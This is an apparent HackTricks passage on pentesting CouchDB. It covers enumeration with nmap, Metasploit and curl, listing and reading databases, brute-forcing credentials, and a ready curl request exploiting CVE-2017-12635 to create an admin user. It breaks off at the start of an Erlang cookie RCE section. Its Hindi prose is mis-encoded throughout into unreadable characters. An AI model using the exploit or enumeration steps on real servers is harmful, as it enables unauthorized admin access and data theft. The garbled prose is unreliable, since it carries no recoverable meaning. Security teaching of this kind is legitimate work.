# 5984,6984 - рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ CouchDB

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рд╣реЛ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>

## **рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА**

**CouchDB** рдПрдХ рдмрд╣реБрдореБрдЦреА рдФрд░ рд╢рдХреНрддрд┐рд╢рд╛рд▓реА **рджрд╕реНрддрд╛рд╡реЗрдЬ-рдЕрднрд┐рд╡реНрдпрдХреНрдд рдбреЗрдЯрд╛рдмреЗрд╕** рд╣реИ рдЬреЛ рдкреНрд░рддреНрдпреЗрдХ **рджрд╕реНрддрд╛рд╡реЗрдЬ** рдореЗрдВ **рдХреБрдВрдЬреА-рдорд╛рди рдорд╛рдирдЪрд┐рддреНрд░** рд╕рдВрд░рдЪрд┐рдд рдХрд░рддрд╛ рд╣реИред рджрд╕реНрддрд╛рд╡реЗрдЬ рдХреЗ рднреАрддрд░ рдХреНрд╖реЗрддреНрд░ **рдХреБрдВрдЬреА/рдорд╛рди рдЬреЛрдбрд╝реЗ, рд╕реВрдЪреА рдпрд╛ рдорд╛рдирдЪрд┐рддреНрд░** рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рд╕реНрддреБрдд рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреЛ рдбреЗрдЯрд╛ рднрдВрдбрд╛рд░рдг рдФрд░ рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрддрд┐ рдореЗрдВ рд▓рдЪреАрд▓рд╛рдИ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред

CouchDB рдореЗрдВ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдкреНрд░рддреНрдпреЗрдХ **рджрд╕реНрддрд╛рд╡реЗрдЬ** рдХреЛ рджрд╕реНрддрд╛рд╡реЗрдЬ рд╕реНрддрд░ рдкрд░ рдПрдХ **рдЕрджреНрд╡рд┐рддреАрдп рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛** (`_id`) рд╕реМрдВрдкрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдбреЗрдЯрд╛рдмреЗрд╕ рдореЗрдВ рдХреА рдЧрдИ рдкреНрд░рддреНрдпреЗрдХ рд╕рдВрд╢реЛрдзрди рдХреЛ рдПрдХ **рд╕рдВрд╢реЛрдзрди рд╕рдВрдЦреНрдпрд╛** (`_rev`) рд╕реМрдВрдкреА рдЬрд╛рддреА рд╣реИред рдпрд╣ рд╕рдВрд╢реЛрдзрди рд╕рдВрдЦреНрдпрд╛ рдкрд░рд┐рд╡рд░реНрддрдиреЛрдВ рдХрд╛ **рдЯреНрд░реИрдХрд┐рдВрдЧ рдФрд░ рдкреНрд░рдмрдВрдзрди** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдбреЗрдЯрд╛рдмреЗрд╕ рдореЗрдВ рдбреЗрдЯрд╛ рдХреЛ рдЖрд╕рд╛рдиреА рд╕реЗ рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрддрд┐ рдФрд░ рд╕рдордХреНрд░рдордг рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

**рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкреЛрд░реНрдЯ:** 5984(http), 6984(https)
```
PORT      STATE SERVICE REASON
5984/tcp  open  unknown syn-ack
```
## **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЧрдгрдирд╛**
```bash
nmap -sV --script couchdb-databases,couchdb-stats -p <PORT> <IP>
msf> use auxiliary/scanner/couchdb/couchdb_enum
```
## рдореИрдиреБрдЕрд▓ рдЬрд╛рдВрдЪ

### рдмреИрдирд░
```
curl http://IP:5984/
```
рдпрд╣ рдПрдХ GET рдЕрдиреБрд░реЛрдз рдХреЛ рд╕реНрдерд╛рдкрд┐рдд CouchDB рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкрд░ рдЬрд╛рд░реА рдХрд░рддрд╛ рд╣реИред рдЬрд╡рд╛рдм рдХреБрдЫ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХрд╛ рджрд┐рдЦрдирд╛ рдЪрд╛рд╣рд┐рдП:
```bash
{"couchdb":"Welcome","version":"0.10.1"}
{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}
```
{% hint style="info" %}
рдХреГрдкрдпрд╛ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдХрд╛рдЙрдЪрдбреАрдмреА рдХреЗ рд░реВрдЯ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдкрд░ рдЖрдкрдХреЛ `401 рдЕрдирдзрд┐рдХреГрдд` рдорд┐рд▓рддрд╛ рд╣реИ рдФрд░ рдХреБрдЫ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХрд╛ рд╕рдВрджреЗрд╢ рджрд┐рдЦрд╛рдИ рджреЗрддрд╛ рд╣реИ: `{"error":"unauthorized","reason":"Authentication required."}` рддреЛ **рдЖрдкрдХреЛ** рдмреИрдирд░ рдпрд╛ рдХрд┐рд╕реА рдЕрдиреНрдп рдПрдВрдбрдкреНрд╡рд╛рдЗрдВрдЯ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реЛрдЧреАред
{% endhint %}

### рд╕реВрдЪрдирд╛ рдЧрдгрдирд╛

рдпреЗ рдПрдВрдбрдкреНрд╡рд╛рдЗрдВрдЯреНрд╕ рд╣реИрдВ рдЬрд╣рд╛рдБ рдЖрдк **GET** рдЕрдиреБрд░реЛрдз рдХреЗ рд╕рд╛рде рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдХреБрдЫ рджрд┐рд▓рдЪрд╕реНрдк рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдк [**рдХрд╛рдЙрдЪрдбреАрдмреА рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг рдореЗрдВ рдЕрдзрд┐рдХ рдПрдВрдбрдкреНрд╡рд╛рдЗрдВрдЯреНрд╕ рдФрд░ рд╡рд┐рд╕реНрддреГрдд рд╡рд┐рд╡рд░рдг рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ**](https://docs.couchdb.org/en/latest/api/index.html)ред

* **`/_active_tasks`** рдЪрд▓ рд░рд╣реЗ рдХрд╛рд░реНрдпреЛрдВ рдХреА рд╕реВрдЪреА, рдЬрд┐рд╕рдореЗрдВ рдХрд╛рд░реНрдп рдХрд╛ рдкреНрд░рдХрд╛рд░, рдирд╛рдо, рд╕реНрдерд┐рддрд┐ рдФрд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЖрдИрдбреА рд╢рд╛рдорд┐рд▓ рд╣реИред
* **`/_all_dbs`** рдХрд╛рдЙрдЪрдбреАрдмреА рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рд╕рднреА рдбреЗрдЯрд╛рдмреЗрд╕ рдХреА рд╕реВрдЪреА рд▓реМрдЯрд╛рддрд╛ рд╣реИред
* **`/_cluster_setup`** рдиреЛрдб рдпрд╛ рдХреНрд▓рд╕реНрдЯрд░ рдХреА рд╕реНрдерд┐рддрд┐, рдХреНрд▓рд╕реНрдЯрд░ рд╕реЗрдЯрдЕрдк рд╡рд┐рдЬрд╝рд╛рд░реНрдб рдХреЗ рдЕрдиреБрд╕рд╛рд░ рд▓реМрдЯрд╛рддрд╛ рд╣реИред
* **`/_db_updates`** рдХрд╛рдЙрдЪрдбреАрдмреА рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рд╕рднреА рдбреЗрдЯрд╛рдмреЗрд╕ рдШрдЯрдирд╛рдУрдВ рдХреА рд╕реВрдЪреА рд▓реМрдЯрд╛рддрд╛ рд╣реИред рдЗрд╕ рдПрдВрдбрдкреНрд╡рд╛рдЗрдВрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `_global_changes` рдбреЗрдЯрд╛рдмреЗрд╕ рдХреА рдореМрдЬреВрджрдЧреА рдЖрд╡рд╢реНрдпрдХ рд╣реИред
* **`/_membership`** `cluster_nodes` рдХреЗ рд░реВрдк рдореЗрдВ рдХреНрд▓рд╕реНрдЯрд░ рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рдмрдиреЗ рдиреЛрдб рджрд┐рдЦрд╛рддрд╛ рд╣реИред `all_nodes` рдлрд╝реАрд▓реНрдб рдЙрди рд╕рднреА рдиреЛрдбреНрд╕ рдХреЛ рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдЬрд┐рдирдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдпрд╣ рдиреЛрдб рдЬрд╛рдирддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдХреНрд▓рд╕реНрдЯрд░ рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рд╣реИред
* **`/_scheduler/jobs`** рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рдХрд╛рд░реНрдпреЛрдВ рдХреА рд╕реВрдЪреАред рдкреНрд░рддреНрдпреЗрдХ рдХрд╛рд░реНрдп рд╡рд┐рд╡рд░рдг рдореЗрдВ рд╕реНрд░реЛрдд рдФрд░ рд▓рдХреНрд╖реНрдп рд╕реВрдЪрдирд╛, рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рдЖрдИрдбреА, рд╣рд╛рд▓ рдХреА рдШрдЯрдирд╛ рдХрд╛ рдЗрддрд┐рд╣рд╛рд╕, рдФрд░ рдХреБрдЫ рдЕрдиреНрдп рдЪреАрдЬрд╝реЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВрдЧреАред
* **`/_scheduler/docs`** рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдХреА рд╕реВрдЪреАред `completed` рдФрд░ `failed` рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдореЗрдВ рднреА рд╕рднреА рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рд╢рд╛рдорд┐рд▓ рд╣реИред рдкреНрд░рддреНрдпреЗрдХ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЗ рд▓рд┐рдП рдпрд╣ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдЖрдИрдбреА, рдбреЗрдЯрд╛рдмреЗрд╕, рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рдЖрдИрдбреА, рд╕реНрд░реЛрдд рдФрд░ рд▓рдХреНрд╖реНрдп, рдФрд░ рдЕрдиреНрдп рдЬрд╛рдирдХрд╛рд░реА рд▓реМрдЯрд╛рддрд╛ рд╣реИред
* **`/_scheduler/docs/{replicator_db}`**
* **`/_scheduler/docs/{replicator_db}/{docid}`**
* **`/_node/{node-name}`** `/_node/{node-name}` рдПрдВрдбрдкреНрд╡рд╛рдЗрдВрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдЕрдиреБрд░реЛрдз рдкреНрд░рд╕рдВрд╕реНрдХрд░рдг рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╕рд░реНрд╡рд░ рдХреЗ рдПрд░рд▓реИрдВрдЧ рдиреЛрдб рдирд╛рдо рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рд╕рдмрд╕реЗ рдЙрдкрдпреЛрдЧреА рд╣реЛрддрд╛ рд╣реИ рдЬрдм `/_node/_local` рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдкреБрдирдГ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╣реЛред
* **`/_node/{node-name}/_stats`** `_stats` рд╕рдВрд╕рд╛рдзрди рдПрдХ рдЪрд▓ рд░рд╣реЗ рд╕рд░реНрд╡рд░ рдХреЗ рд▓рд┐рдП рдЖрдБрдХрдбрд╝реЗ рд╕рдореЗрдд рдПрдХ JSON рдСрдмреНрдЬреЗрдХреНрдЯ рд▓реМрдЯрд╛рддрд╛ рд╣реИред рд╢рдмреНрджрдХреЛрд╢реАрдп рд╕реНрдЯреНрд░рд┐рдВрдЧ `_local` рд╕реНрдерд╛рдиреАрдп рдиреЛрдб рдирд╛рдо рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрдкрдирд╛рдо рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рд╕рднреА рдЖрдБрдХрдбрд╝реЗ URL рдХреЗ рд▓рд┐рдП, `{node-name}` рдХреЛ `_local` рд╕реЗ рдмрджрд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рд╕реНрдерд╛рдиреАрдп рдиреЛрдб рдХреЗ рдЖрдБрдХрдбрд╝реЛрдВ рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред
* **`/_node/{node-name}/_system`** \_system рд╕рдВрд╕рд╛рдзрди рдПрдХ рдЪрд▓ рд░рд╣реЗ рд╕рд░реНрд╡рд░ рдХреЗ рд▓рд┐рдП рд╡рд┐рднрд┐рдиреНрди рд╕рд┐рд╕реНрдЯрдо рд╕реНрддрд░реАрдп рдЖрдБрдХрдбрд╝реЗ рд╕рдореЗрдд рдПрдХ JSON рдСрдмреНрдЬреЗрдХреНрдЯ рд▓реМрдЯрд╛рддрд╛ рд╣реИред рдЖрдк \_\_`_local` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ {node-name} рд╡рд░реНрддрдорд╛рди рдиреЛрдб рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред
* **`/_node/{node-name}/_restart`**
* **`/_up`** рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рд╕рд░реНрд╡рд░ рдЪрд╛рд▓реВ рд╣реИ, рдЪрд▓ рд░рд╣рд╛ рд╣реИ, рдФрд░ рдЕрдиреБрд░реЛрдзреЛрдВ рдХрд╛ рдЬрд╡рд╛рдм рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рддреИрдпрд╛рд░ рд╣реИред рдпрджрд┐ [`maintenance_mode`](https://docs.couchdb.org/en/latest/config/couchdb.html#couchdb/maintenance\_mode) `true` рдпрд╛ `nolb` рд╣реИ, рддреЛ рдПрдВрдбрдкреНрд╡рд╛рдЗрдВрдЯ рдПрдХ 404 рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд▓реМрдЯрд╛рдПрдЧрд╛ред
* **`/_uuids`** рдХрд╛рдЙрдЪрдбреАрдмреА рдЙрджрд╛рд╣рд░рдг рд╕реЗ рдПрдХ рдпрд╛ рдПрдХ рд╕реЗ рдЕрдзрд┐рдХ рдпреВрдирд┐рд╡рд░реНрд╕рд▓реА рдЕрджреНрд╡рд┐рддреАрдп рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛ (UUIDs) рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рддрд╛ рд╣реИред
* **`/_reshard`** рдХреНрд▓рд╕реНрдЯрд░ рдкрд░ рдкреВрд░реНрдг, рд╡рд┐рдлрд▓, рдЪрд▓ рд░рд╣реЗ, рд░реЛрдХреЗ рдЧрдП, рдФрд░ рдХреБрд▓ рдХрд╛рд░реНрдпреЛрдВ рдХреА рдЧрдгрдирд╛ рдХреЗ рд╕рд╛рде рд░реАрд╢рд╛рд░реНрдбрд┐рдВрдЧ рдХреА рд╕реНрдерд┐рддрд┐ рд▓реМрдЯрд╛рддрд╛ рд╣реИред

рдпрд╣рд╛рдБ рд╡рд┐рд╕реНрддрд╛рд░ рд╕реЗ рд╕рдордЭрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдФрд░ рднреА рджрд┐рд▓рдЪрд╕реНрдк рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓реА рдЬрд╛ рд╕рдХрддреА рд╣реИ: [https://lzone.de/cheat-sheet/CouchDB](https://lzone.de/cheat-sheet/CouchDB)

### **рдбреЗрдЯрд╛рдмреЗрд╕ рд╕реВрдЪреА**
```
curl -X GET http://IP:5984/_all_dbs
```
рдпрджрд┐ рдЙрд╕ рдЕрдиреБрд░реЛрдз рдХрд╛ **401 рдЕрдирдзрд┐рдХреГрдд** рдЬрд╡рд╛рдм рджреЗрддрд╛ рд╣реИ, рддреЛ рдЖрдкрдХреЛ рдбреЗрдЯрд╛рдмреЗрд╕ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ **рд╡реИрдз рдкреНрд░рдорд╛рдг рдкрддреНрд░** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ:
```
curl -X GET http://user:password@IP:5984/_all_dbs
```
**рд╡реИрдз рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕** рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк **рд╕реЗрд╡рд╛ рдХреЛ рдмреНрд░реВрдЯрдлреЛрд░реНрд╕ рдХрд░рдиреЗ** рдХреА **рдХреЛрд╢рд┐рд╢** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдпрд╣ рдПрдХ couchdb **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХрд╛ рдЙрджрд╛рд╣рд░рдг** рд╣реИ рдЬрдм рдЖрдкрдХреЗ рдкрд╛рд╕ **рдкрд░реНрдпрд╛рдкреНрдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░** рд╣реЛрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЖрдк рдбреЗрдЯрд╛рдмреЗрд╕реЛрдВ рдХреА рд╕реВрдЪреА рдмрдирд╛ рд╕рдХреЗрдВ (рдпрд╣ рдХреЗрд╡рд▓ рдбреЗрдЯрд╛рдмреЗрд╕реЛрдВ рдХреА рдПрдХ рд╕реВрдЪреА рд╣реИ):
```bash
["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]
```
### рдбреЗрдЯрд╛рдмреЗрд╕ рдЬрд╛рдирдХрд╛рд░реА

рдЖрдк рдбреЗрдЯрд╛рдмреЗрд╕ рдирд╛рдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреБрдЫ рдбреЗрдЯрд╛рдмреЗрд╕ рдЬрд╛рдирдХрд╛рд░реА (рдЬреИрд╕реЗ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреА рд╕рдВрдЦреНрдпрд╛ рдФрд░ рдЖрдХрд╛рд░) рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
curl http://IP:5984/<database>
curl http://localhost:5984/simpsons
#Example response:
{"db_name":"simpsons","update_seq":"7-g1AAAAFTeJzLYWBg4MhgTmEQTM4vTc5ISXLIyU9OzMnILy7JAUoxJTIkyf___z8rkQmPoiQFIJlkD1bHjE-dA0hdPFgdAz51CSB19WB1jHjU5bEASYYGIAVUOp8YtQsgavfjtx-i9gBE7X1i1D6AqAX5KwsA2vVvNQ","sizes":{"file":62767,"external":1320,"active":2466},"purge_seq":0,"other":{"data_size":1320},"doc_del_count":0,"doc_count":7,"disk_size":62767,"disk_format_version":6,"data_size":2466,"compact_running":false,"instance_start_time":"0"}
```
### **рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рд╕реВрдЪреА**

рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЗ рднреАрддрд░ рдкреНрд░рддреНрдпреЗрдХ рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдХреА рд╕реВрдЪреА рдмрдирд╛рдПрдВ
```bash
curl -X GET http://IP:5984/{dbname}/_all_docs
curl http://localhost:5984/simpsons/_all_docs
#Example response:
{"total_rows":7,"offset":0,"rows":[
{"id":"f0042ac3dc4951b51f056467a1000dd9","key":"f0042ac3dc4951b51f056467a1000dd9","value":{"rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329"}},
{"id":"f53679a526a868d44172c83a61000d86","key":"f53679a526a868d44172c83a61000d86","value":{"rev":"1-7b8ec9e1c3e29b2a826e3d14ea122f6e"}},
{"id":"f53679a526a868d44172c83a6100183d","key":"f53679a526a868d44172c83a6100183d","value":{"rev":"1-e522ebc6aca87013a89dd4b37b762bd3"}},
{"id":"f53679a526a868d44172c83a61002980","key":"f53679a526a868d44172c83a61002980","value":{"rev":"1-3bec18e3b8b2c41797ea9d61a01c7cdc"}},
{"id":"f53679a526a868d44172c83a61003068","key":"f53679a526a868d44172c83a61003068","value":{"rev":"1-3d2f7da6bd52442e4598f25cc2e84540"}},
{"id":"f53679a526a868d44172c83a61003a2a","key":"f53679a526a868d44172c83a61003a2a","value":{"rev":"1-4446bfc0826ed3d81c9115e450844fb4"}},
{"id":"f53679a526a868d44172c83a6100451b","key":"f53679a526a868d44172c83a6100451b","value":{"rev":"1-3f6141f3aba11da1d65ff0c13fe6fd39"}}
]}
```
### **рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдкрдврд╝реЗрдВ**

рдПрдХ рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЗ рдЕрдВрджрд░ рдПрдХ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреА рд╕рд╛рдордЧреНрд░реА рдкрдврд╝реЗрдВ:
```bash
curl -X GET http://IP:5984/{dbname}/{id}
curl http://localhost:5984/simpsons/f0042ac3dc4951b51f056467a1000dd9
#Example response:
{"_id":"f0042ac3dc4951b51f056467a1000dd9","_rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329","character":"Homer","quote":"Doh!"}
```
## CouchDB рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирддрд┐ [CVE-2017-12635](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-12635)

рдПрд░рд▓реИрдВрдЧ рдФрд░ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ JSON рдкрд╛рд░реНрд╕рд░реНрд╕ рдХреЗ рдмреАрдЪ рдЕрдВрддрд░ рдХреЗ рдХрд╛рд░рдг рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЕрдиреБрд░реЛрдз рдХреЗ рд╕рд╛рде рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ `hacktricks:hacktricks` рдХреЗ рд╕рд╛рде **рдПрдХ рдПрдбрдорд┐рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдирд╛ рд╕рдХрддреЗ рдереЗ**:
```bash
curl -X PUT -d '{"type":"user","name":"hacktricks","roles":["_admin"],"roles":[],"password":"hacktricks"}' localhost:5984/_users/org.couchdb.user:hacktricks -H "Content-Type:application/json"
```
[**рдЗрд╕ vuln рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдпрд╣рд╛рдБ**](https://justi.cz/security/2017/11/14/couchdb-rce-npm.html).

## CouchDB RCE

### **Erlang рдХреБрдХреА рд╕реБрд░рдХреНрд╖рд╛ рдЕрд╡рд▓реЛрдХрди**

рдЙрджрд╛рд╣рд░рдг [рдпрд╣рд╛рдБ рд╕реЗ](https://0xdf.gitlab.io/2018/09/15/htb-canape.html).

рдХрд╛рдЙрдЪрдбреАрдмреА рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг рдореЗрдВ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдХреНрд▓рд╕реНрдЯрд░ рд╕реЗрдЯ-рдЕрдк рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдЦрдВрдб рдореЗрдВ ([рд▓рд┐рдВрдХ](http://docs.couchdb.org/en/stable/cluster/setup.html#cluster-setup)), рдХрд╛рдЙрдЪрдбреАрдмреА рджреНрд╡рд╛рд░рд╛ рдХреНрд▓рд╕реНрдЯрд░ рдореЛрдб рдореЗрдВ рдкреЛрд░реНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдЙрд▓реНрд▓реЗрдЦ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐, рд╕реНрдерд╛рдирд┐рдХ рдореЛрдб рдХреА рддрд░рд╣, рдкреЛрд░реНрдЯ `5984` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдкреЛрд░реНрдЯ `5986` рдиреЛрдб-рд╕реНрдерд╛рдирд┐рдХ API рдХреЗ рд▓рд┐рдП рд╣реИ, рдФрд░ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд░реВрдк рд╕реЗ, Erlang рдХреЗ рд▓рд┐рдП TCP рдкреЛрд░реНрдЯ `4369` рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдЬреЛ Erlang рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рднреАрддрд░ рдиреЛрдб рд╕рдВрдЪрд╛рд░ рдХреЛ рд╕реБрд╡рд┐рдзрд╛ рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ Erlang Port Mapper Daemon (EPMD) рд╣реИред рдпрд╣ рд╕реЗрдЯрдЕрдк рдПрдХ рдиреЗрдЯрд╡рд░реНрдХ рдмрдирд╛рддрд╛ рд╣реИ рдЬрд╣рд╛рдВ рдкреНрд░рддреНрдпреЗрдХ рдиреЛрдб рд╣рд░ рдЕрдиреНрдп рдиреЛрдб рд╕реЗ рдЬреБрдбрд╝рд╛ рд╣реЛрддрд╛ рд╣реИред

